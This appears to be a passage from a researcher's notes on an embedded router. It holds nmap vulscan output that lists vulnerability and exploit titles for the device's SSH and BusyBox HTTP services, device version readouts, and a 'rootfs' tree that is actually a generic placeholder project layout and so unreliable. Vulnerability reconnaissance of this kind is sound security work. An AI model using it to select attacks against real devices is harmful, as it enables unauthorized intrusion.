| [9215] OpenBSD sshd authentication error on systems using YP with netgroups could allow unauthorized access
| [8470] WinSSHD incomplete connections denial of service
| [1249] Sshd version 1.2.23 obsolete
| [316] Sshd advertises information
| [314] Sshd version 1.2.17 obsolete
| 
| Exploit-DB - https://www.exploit-db.com:
| [11618] ProSSHD 1.2 20090726 - Buffer Overflow Exploit
| 
| OpenVAS (Nessus) - http://www.openvas.org:
| [56070] Gentoo Security Advisory GLSA 200512-13 (dropbear)
| 
| SecurityTracker - https://www.securitytracker.com:
| [1027826] freeSSHd Bug Lets Remote Users Gain Access to the Target System
| [1026743] Dropbear SSH Server Use-After-Free Lets Remote Authenticated Users Execute Arbitrary Code
| [1023235] Solaris sshd Timeout Mechanism Lets Remote Users Deny Service
| [1022811] freeSSHd Unspecified Flaw Lets Remote Users Deny Service
| [1021096] freeSSHd Buffer Overflow Lets Remote Authenticated Users Execute Arbitrary Code
| [1020212] freeSSHd Stack Overflow in Processing Directory Name Lets Remote Users Execute Arbitrary Code
| [1015742] Dropbear SSH Server Authorization-Pending Limit Lets Remote Users Deny Service
| [1010785] Dropbear SSH Server DSS Verification Memory Error May Let Remote Users Execute Arbitrary Code
| [1009708] Sun Solaris sshd May Fail to Log SSH Client IP Addresses
| [1007523] Dropbear SSH Server Format String Flaw Lets Remote Users Execute Arbitrary Code
| [1003840] Bitvise WinSSHD Protocol State Error Allows Remote Users to Cause the Secure Shell Server to Stop Accepting Incoming Connections
| [1002748] OpenSSH 3.0 Denial of Service Condition May Allow Remote Users to Crash the sshd Daemon and KerberosV Configuration Error May Allow Remote Users to Partially Authenticate When Authentication Should Not Be Permitted
| 
| OSVDB - http://www.osvdb.org:
| [95970] PuTTY sshrsa.c / sshdss.c getstring() Function SSH Handshake Message Length Handling Multiple Remote Integer Overflows
| [88006] freeSSHd Login Failure Remote Authentication Bypass
| [82595] freeSSHd Malformed Packet Handling Remote DoS
| [79590] Dropbear SSH Server Channel Concurrency Use-after-free Remote Code Execution
| [78706] OpenSSH auth-options.c sshd auth_parse_options Function authorized_keys Command Option Debug Message Information Disclosure
| [78425] Oracle Solaris sshd Component Unspecified Remote DoS
| [67743] Novell NetWare OpenSSH SSHD.NLM Absolute Path Handling Remote Overflow
| [67623] freeSSHd SSH Key Exchange NULL Dereference Remote DoS
| [61907] Cisco IOS XR SSH Server sshd_child_handler Process Crafted Packet Remote DoS
| [60498] Solaris sshd(1M) Timeout Mechanism Unspecified Remote DoS
| [59353] OpenSSH sshd Local TCP Redirection Connection Masking Weakness
| [59352] SSH sshd Local TCP Redirection Connection Masking Weakness
| [58495] OpenSSH sshd ChrootDirectory Feature SetUID Hard Link Local Privilege Escalation
| [57927] freeSSHd Unspecified Pre-authentication Remote DoS
| [54362] freeSSHd SFTP Command Handling Multiple Remote Overflows
| [50057] freeSSHd Multiple Parameters Remote Overflow
| [49386] OpenSSH sshd TCP Connection State Remote Account Enumeration
| [48791] OpenSSH on Debian sshd Crafted Username Arbitrary Remote SELinux Role Access
| [45867] freeSSHd SFTP Command Name Handling Overflow
| [43278] FortressSSH sshd.exe Data Object Handling Remote DoS
| [42766] Georgia SoftWorks SSH2 Server (GSW_SSHD) username Field Remote Format String
| [42765] Georgia SoftWorks SSH2 Server (GSW_SSHD) Multiple Authentication Fields Remote Overflow
| [42484] Fail2ban Crafted Client Version sshd Log File Parsing Arbitrary Host Addition DoS
| [42482] DenyHosts Crafted Client Version sshd Log File Parsing Arbitrary Host Addition DoS
| [41849] freeSSHd SSH Server Crafted Packet NULL Pointer Dereference Remote DoS
| [36758] InterWorx-CP NodeWorx sshd.php PATH_INFO Parameter XSS
| [36515] BlockHosts sshd/vsftpd hosts.allow Arbitrary Deny Entry Manipulation
| [33814] Dropbear dbclient hostkey Mismatch Warning Weakness
| [32088] Dropbear SSH dbclient Hostkey Mismatch Weakness
| [31795] Fail2ban sshd Log File Parsing Arbitrary Host Denial DoS
| [28159] SSH Tectia Management Agent sshd Restart Local Privilege Escalation
| [25463] freeSSHd Key Exchange Algorithm String Remote Overflow
| [23960] Dropbear SSH Authorization-pending Connection Saturation DoS
| [21847] Dropbear SSH Server svr_ses.childpidsize Remote Overflow
| [8138] Dropbear SSH Server buffer.c Overflow Issue
| [8137] Dropbear SSH Server DSS Verification Failure Remote Privilege Escalation
| [8040] sshd Authentication Agent Mechanism Arbitrary User Credential Disclosure
| [8039] Bitvise WinSSHD Incomplete Connection Saturation DoS
| [8037] Rapidstream VPN sshd Default Hardcoded Admin Account
| [8035] SSH Server sshd2 Failed Login Attempt Logging Failure
| [5010] Solaris SSHD Client IP Logging Failure
| [2429] Dropbear SSH Server Username Remote Format String
| [2109] OpenSSH sshd Root Login Timing Side-Channel Weakness
| [1773] SSH sshd Connection Saturation DoS
| [1586] sshd scp Traversal Arbitrary File Overwrite
```

### HTTP

```
80/tcp open  http    BusyBox http 1.19.4
| vulscan: VulDB - https://vuldb.com:
| [117389] GNU wget up to 1.19.4 Cookie http.c resp_new privilege escalation
| [145989] MediaWiki up to 1.19.3/1.20.2 HttpFunctions.php privilege escalation
| [108657] GNU wget up to 1.19.1 HTTP Chunk Size src/retr.c fd_read_body memory corruption
| [108656] GNU wget up to 1.19.1 HTTP Chunk Size src/http.c skip_short_body memory corruption
| [97579] GNU wget up to 1.19.1 HTTP Header url.c url_parse privilege escalation
| [51536] Acme Mini HTTPd 1.19 Terminal privilege escalation
| [11233] MediaWiki 1.19.8/1.20.7/1.21.2 HTTP Header Caching weak authentication
| 
| MITRE CVE - https://cve.mitre.org:
| [CVE-2009-4490] mini_httpd 1.19 writes data to a log file without sanitizing non-printable characters, which might allow remote attackers to modify a window's title, or possibly execute arbitrary commands or overwrite files, via an HTTP request containing an escape sequence for a terminal emulator.
| 
| SecurityFocus - https://www.securityfocus.com/bid/:
| [39590] HTTP 1.1 GET Request Directory Traversal Vulnerability
| [19987] Microsoft Internet Explorer HTTP 1.1 and Compression Long URI Buffer Overflow Variant Vulnerability
| [19667] Microsoft Internet Explorer HTTP 1.1 and Compression Long URI Buffer Overflow Vulnerability
| [5697] Trend Micro InterScan VirusWall HTTP 1.1 Transfer-Encoding Bypass Vulnerability
| [37966] Apache 1.3 mod_proxy HTTP Chunked Encoding Integer Overflow Vulnerability
| [30988] 3Com Wireless 8760 Dual-Radio 11a/b/g PoE HTTP POST Request Denial of Service Vulnerability
| [29110] ZyWALL 100 HTTP Referer Header Cross Site Scripting Vulnerability
| [27237] Apache HTTP Server 2.2.6, 2.0.61 and 1.3.39 'mod_status' Cross-Site Scripting Vulnerability
| [17383] Cisco 11500 Content Services Switch HTTP Compression Remote Denial of Service Vulnerability
| 
| IBM X-Force - https://exchange.xforce.ibmcloud.com:
| [28893] Microsoft Internet Explorer HTTP 1.1 compression long URL buffer overflow variant
| [28522] Microsoft Internet Explorer HTTP 1.1 compression long URL buffer overflow
| [10106] Trend Micro InterScan VirusWall HTTP 1.1 chunked transfer encoding protection bypass
| [10107] Trend Micro InterScan VirusWall HTTP 1.0 gzip content encoding protection bypass
| 
| Exploit-DB - https://www.exploit-db.com:
| [29348] phpCMS 1.1.7 include/class.http_indexer_phpcms.php PHPCMS_INCLUDEPATH Parameter Remote File Inclusion
| [28595] BusyBox 1.01 HTTPD Directory Traversal Vulnerability
| [25837] Monkey HTTPD 1.1.1 - Crash PoC
| [25083] RaidenHTTPD 1.1.27 Remote File Disclosure Vulnerability
| [23480] Surfboard httpd 1.1.9 - Remote Buffer Overflow Vulnerability
| [22460] Abyss Web Server 1.1.2 Incomplete HTTP Request Denial of Service Vulnerability
| [22207] 3ware Disk Managment 1.10 Malformed HTTP Request DoS Vulnerability
| [22106] CUPS 1.1.x Negative Length HTTP Header Vulnerability
| [22009] EZ Systems HTTPBench 1.1 Information Disclosure Vulnerability
| [21757] OmniHTTPD 1.1/2.0.x/2.4 Sample Application URL Encoded Newline HTML Injection
| [21754] OmniHTTPd 1.1/2.0.x/2.4 test.shtml Sample Application XSS
| [21753] OmniHTTPd 1.1/2.0.x/2.4 test.php Sample Application XSS
| [20847] 3Com OfficeConnect DSL Router 812 1.1.7/840 1.1.7 HTTP Port Router DoS
| [20662] WhitSoft SlimServe HTTPD 1.1 Get Denial of Service Vulnerability
| [20304] Omnicron OmniHTTPD 1.1/2.0 Alpha 1 visiadmin.exe Denial of Service Vulnerability
| [19566] Omnicron OmniHTTPD 1.1/2.4 Pro Buffer Overflow Vulnerability
| [19536] Apache <= 1.1,NCSA httpd <= 1.5.2,Netscape Server 1.12/1.1/2.0 a nph-test-cgi Vulnerability
| [18629] Tiny Server <= 1.1.9 HTTP HEAD DoS
| [18524] Tiny HTTP Server <= 1.1.9 - Remote Crash PoC
| [13355] linux/x86 HTTP/1.x GET, Downloads and execve() 111 bytes+
| [12331] MultiThreaded HTTP Server 1.1 - Directory Traversal
| [12308] MultiThreaded HTTP Server 1.1 - Source Disclosure
| [12304] MultiThreaded HTTP Server 1.1 - Directory Traversal
| [11254] P2GChinchilla HTTP Server 1.1.1 - Denial of Service Exploit
| [2328] RaidenHTTPD 1.1.49 (SoftParserFileXml) Remote Code Execution Exploit
| [31056] HFS HTTP File Server 1.5/2.x Multiple Security Vulnerabilities
| [30983] ExpressionEngine 1.2.1 HTTP Response Splitting and Cross Site Scripting Vulnerabilities
| [30322] Lighttpd <= 1.4.15 Multiple Code Execution, Denial of Service and Information Disclosure Vulnerabilities
| [30229] SHTTPD 1.38 Filename Parse Error Information Disclosure Vulnerability
| [30218] BugHunter HTTP Server 1.6.2 Parse Error Information Disclosure Vulnerability
| [29919] TP-Link TL-WR740N / TL-WR740ND - 150M Wireless Lite N Router HTTP DoS
| [29849] ToendaCMS 1.5.3 HTTP Get And Post Forms HTML Injection Vulnerability
| [29803] Static Http Server 1.0 - Denial of Service (DoS) Exploit
| [29503] KarjaSoft Sami HTTP Server 1.0.4/1.0.5/2.0.1 Request Remote Denial of Service Vulnerability
| [28568] NX5Linkx 1.0 Links.PHP HTTP Response Splitting Vulnerability
| [27127] PMachine ExpressionEngine 1.4.1 HTTP Referrer HTML Injection Vulnerability
| [26739] Ultra Mini HTTPD 1.21 - Stack Buffer Overflow
| [26691] WebCalendar 1.0.1 Layers_Toggle.PHP HTTP Response Splitting Vulnerability
| [26520] Static HTTP Server 1.0 - SEH Overflow
| [26156] CPaint 1.3 xmlhttp Request Input Validation Vulnerability
| [25933] slimserve httpd 1.0/1.1 - Directory Traversal vulnerability
| [25775] Nginx HTTP Server 1.3.9-1.4.0 Chuncked Encoding Stack Buffer Overflow
| [25365] AN HTTPD 1.42 Arbitrary Log Content Injection Vulnerability
| [24667] Wordpress 1.2 Wp-login.PHP HTTP Response Splitting Vulnerability
| [24402] Axis Network Camera 2.x And Video Server 1-3 HTTP Authentication Bypass
| [24103] MailEnable Mail Server HTTPMail 1.x Remote Heap Overflow Vulnerability
| [23714] KarjaSoft Sami HTTP Server 1.0.4 GET Request Buffer Overflow Vulnerability
| [23676] MaxWebPortal 1.3x down.asp HTTP_REFERER XSS
| [23614] Loom Software SurfNow 1.x/2.x Remote HTTP GET Request Denial of Service Vulnerability
| [23584] McAfee ePolicy Orchestrator 1.x/2.x/3.0 Agent HTTP POST Buffer Mismanagement Vulnerability
| [23582] Acme thttpd 1.9/2.0.x CGI Test Script Cross-Site Scripting Vulnerability
| [23397] Monit 1.4/2.x/3/4 Overly Long HTTP Request Buffer Overrun Vulnerability
| [23325] BRS WebWeaver 1.06 httpd `User-Agent` Remote Denial of Service Vulnerability
| [23144] minihttp file-sharing for net 1.5 - Directory Traversal vulnerability
| [22909] NetSuite 1.0/1.2 HTTP Server Directory Traversal Vulnerability
| [22902] lighttpd 1.4.31 Denial of Service PoC
| [22892] Mabry Software HTTPServer/X 1.0 0.047 File Disclosure Vulnerability
| [22795] MiniHTTPServer WebForums Server 1.x/2.0 - Remote Directory Traversal Vulnerability
| [22610] Snowblind Web Server 1.0/1.1 HTTP GET Request Buffer Overflow Vulnerability
| [22608] Snowblind Web Server 1.0/1.1 Malformed HTTP Request Denial of Service Vulnerability
| [22515] AN HTTPD 1.x Count.pl Directory Traversal Vulnerability
| [22130] AN HTTPD 1.41 e Cross Site Scripting Vulnerability
| [22064] zeroo http server 1.5 - Directory Traversal vulnerability (2)
| [22063] zeroo http server 1.5 - Directory Traversal vulnerability (1)
| [22021] Lonerunner Zeroo HTTP Server 1.5 - Remote Buffer Overflow Vulnerability
| [22016] LibHTTPD 1.2 POST Buffer Overflow Vulnerability
| [21978] Linksys WAP11 1.3/1.4,D-Link DI-804 4.68/Dl-704 2.56 b5 Embedded HTTP Server DoS Vulnerability
| [21955] AN HTTPD 1.38/1.39/1.40/1.41 Malformed SOCKS4 Request Buffer Overflow Vulnerability
| [21937] ghttpd 1.4.x Log() Function Buffer Overflow Vulnerability
| [21710] MyWebServer 1.0.2 Long HTTP Request HTML Injection Vulnerability
| [21145] IBM HTTP Server 1.3.x Source Code Disclosure Vulnerability
| [21050] NCSA httpd 1.x Buffer Overflow Vulnerability (2)
| [21049] NCSA httpd 1.x Buffer Overflow Vulnerability (1)
| [20978] Cisco IOS 11.x/12.x HTTP Configuration Arbitrary Administrative Access Vulnerability (4)
| [20977] Cisco IOS 11.x/12.x HTTP Configuration Arbitrary Administrative Access Vulnerability (3)
| [20976] Cisco IOS 11.x/12.x HTTP Configuration Arbitrary Administrative Access Vulnerability (2)
| [20975] Cisco IOS 11.x/12.x HTTP Configuration Arbitrary Administrative Access Vulnerability (1)
| [20929] ghttpd 1.4 Daemon Buffer Overflow Vulnerability
| [20657] robin twombly a1 http server 1.0 - Directory Traversal vulnerability
| [20656] Robin Twombly A1 HTTP Server 1.0 - Denial of Service Vulnerability
| [20595] NCSA 1.3/1.4.x/1.5,Apache httpd 0.8.11/0.8.14 ScriptAlias Source Retrieval Vulnerability
| [20531] IBM HTTP Server 1.3 AfpaCache/WebSphereNet.Data DoS Vulnerability
| [20449] GlimpseHTTP 1.0/2.0 and WebGlimpse 1.0 Piped Command Vulnerability
| [20435] Apache 0.8.x/1.0.x,NCSA httpd 1.x test-cgi Directory Listing Vulnerability
| [20423] NCSA httpd-campas 1.2 sample script Vulnerability
| [20403] Small HTTP server 2.0 1 Non-Existent File DoS Vulnerability
| [20323] "Cisco IOS 12 Software ""?/"" HTTP Request DoS Vulnerability"
| [20120] httpdx <= 1.5.4 - Remote Heap Overflow
| [20054] West Street Software LocalWEB HTTP Server 1.2 - Buffer Overflow
| [20017] Max Feoktistov Small HTTP server 1.212 Buffer Overflow
| [19988] httpdx 1.5.4 - Remote HTTP Server Denial of Service
| [19882] Cisco IOS 11.x/12.x HTTP %% Vulnerability
| [19866] DomsHttpd <= 1.0 - Remote Denial of Service Exploit
| [19587] AN-HTTPd 1.2 b CGI Vulnerabilities
| [17859] Toko Lite CMS 1.5.2 (edit.php) HTTP Response Splitting Vulnerability
| [17669] Simple HTTPd 1.42 PUT Request Remote Buffer Overflow Vulnerability
| [17658] Simple HTTPd 1.42 Denial of Servive Exploit
| [17200] ZenPhoto 1.4.0.3 x-forwarded-for HTTP Header presisitent XSS
| [16759] SHTTPD <= 1.34 URI-Encoded POST Request Overflow (win32)
| [16199] Icy Phoenix 1.3.0.53a HTTP Referer stored XSS
| [15981] LifeType 1.2.10 HTTP Referer stored XSS
| [14840] Mereo 1.9.2 - Remote HTTP Server Denial of Service Vulnerability
| [14683] Httpdx 1.5.4 - Multiple Denial of Service Vulnerabilities (http-ftp) PoC
| [14496] UPlusFTP Server 1.7.1.01 - HTTP Remote Buffer Overflow (Post Auth)
| [13308] linux/x86 shellcode that forks a HTTP Server on port tcp/8800 166 bytes
| [11734] httpdx 1.5.3b - Multiple Remote Pre-Authentication DoS (PoC)
| [11500] Easy~Ftp Server 1.7.0.2 - (HTTP) Remote BoF Exploit
| [11343] httpdx 1.5.2 - Remote Pre-Authentication DoS (PoC)
| [10053] httpdx 1.4 Get Request Buffer Overflow
| [10047] Femitter HTTP Server 1.03 Remote Source Disclosure
| [9896] MiniShare HTTP 1.5.5 BoF
| [9886] httpdx 1.4 h_handlepeer BoF
| [9885] httpdx <= 1.4.6b source disclosure
| [9660] Techlogica HTTP Server 1.03 Arbitrary File Disclosure Exploit
| [9657] httpdx Web Server 1.4 (Host Header) Remote Format String DoS Exploit
| [9549] MailEnable 1.52 HTTP Mail Service Stack BOF Exploit PoC
| [9478] HTTP SERVER (httpsv) 1.6.2 (GET 404) Remote Denial of Service Exploit
| [8786] Lighttpd < 1.4.23 Source Code Disclosure Vulnerability (BSD/Solaris bug)
| [5918] uTorrent / BitTorrent WebIU HTTP 1.7.7/6.0.1 Range header DoS Exploit
| [5547] Novell eDirectory < 8.7.3 SP 10 / 8.8.2 - HTTP headers DoS Vulnerability
| [5215] Ruby 1.8.6 (Webrick Httpd 1.3.1) Directory Traversal Vulnerability
| [4717] Simple HTTPD <= 1.41 (/aux) Remote Denial of Service Exploit
| [4700] simple httpd <= 1.38 Multiple Vulnerabilities
| [4437] Lighttpd <= 1.4.17 FastCGI Header Overflow Remote Exploit
| [4391] Lighttpd <= 1.4.16 FastCGI Header Overflow Remote Exploit
| [2974] Http explorer Web Server 1.02 Directory Transversal Vulnerability
| [2482] SHTTPD 1.34 (POST) Remote Buffer Overflow Exploit
| [2277] Streamripper <= 1.61.25 HTTP Header Parsing Buffer Overflow Exploit 2
| [2274] Streamripper <= 1.61.25 HTTP Header Parsing Buffer Overflow Exploit
| [77] Cisco IOS 12.x/11.x HTTP Remote Integer Overflow Exploit
| 
| OpenVAS (Nessus) - http://www.openvas.org:
| [60499] Debian Security Advisory DSA 1513-1 (lighttpd)
| [11129] HTTP 1.1 header overflow
| [66806] Debian Security Advisory DSA 1987-1 (lighttpd)
| [66557] Fedora Core 12 FEDORA-2009-12606 (httpd)
| [66498] Fedora Core 10 FEDORA-2009-12604 (httpd)
| [64741] Fedora Core 11 FEDORA-2009-8812 (httpd)
| [61364] Debian Security Advisory DSA 1540-3 (lighttpd)
| [61357] Debian Security Advisory DSA 1609-1 (lighttpd)
| [60793] Debian Security Advisory DSA 1540-2 (lighttpd)
| [60786] Debian Security Advisory DSA 1540-1 (lighttpd)
| [60573] Debian Security Advisory DSA 1521-1 (lighttpd)
| [58644] Debian Security Advisory DSA 1362-2 (lighttpd)
| [58581] Debian Security Advisory DSA 1362-1 (lighttpd)
| [57684] Debian Security Advisory DSA 1205-2 (thttpd)
| [11127] HTTP 1.0 header overflow
| 
| SecurityTracker - https://www.securitytracker.com:
| [1016731] Microsoft Internet Explorer URL Buffer Overflow in Processing HTTP 1.1 Protocol with Compression Lets Remote Users Execute Arbitrary Code
| [1015870] Cisco 11500 Content Services Switch HTTP Compression Bug Lets Remote Users Deny Service
| 
| OSVDB - http://www.osvdb.org:
| [28132] Microsoft IE HTTP 1.1 URL Parsing Overflow
| [84399] Huawei AR 18 / 29 Routers HTTP Server Pre-auth Multiple URL Handling Remote Overflow
| [79018] Links HTTP 100 Response Handling DoS
| [74826] Pidgin libpurple MSN Protocol Plugin httpconn.c msn_httpconn_parse_data Function HTTP 100 Response Remote DoS
| [64275] NIBE RCU 11 Heat Pump HTTP Request Arbitrary Administrative Account Creation
| [24433] Cisco 11500 Content Services Switch HTTP Compression DoS
| [8854] Cisco CSS 11000 Web Interface HTTPS POST DoS
```
## show command

view-mode>show -o
operating system version:  2.6.21.5-geneko_v1
view-mode>show -f
firmware version:          3.0.19_352
view-mode>show -d
hardware model:            GWR352
view-mode>show -m
motherboard version:       1.2.5
view-mode>show -r
operating system release:  #45 Fri Jun 1 13:10:05 CEST 2012



## Filesystem tree (later)
cmd : # tree -L 1 rootfs/
    ├── build                   # Compiled files (alternatively `dist`)
    ├── docs                    # Documentation files (alternatively `doc`)
    ├── src                     # Source files (alternatively `lib` or `app`)
    ├── test                    # Automated tests (alternatively `spec` or `tests`)
    ├── tools                   # Tools and utilities
    ├── LICENSE
    └── README.md
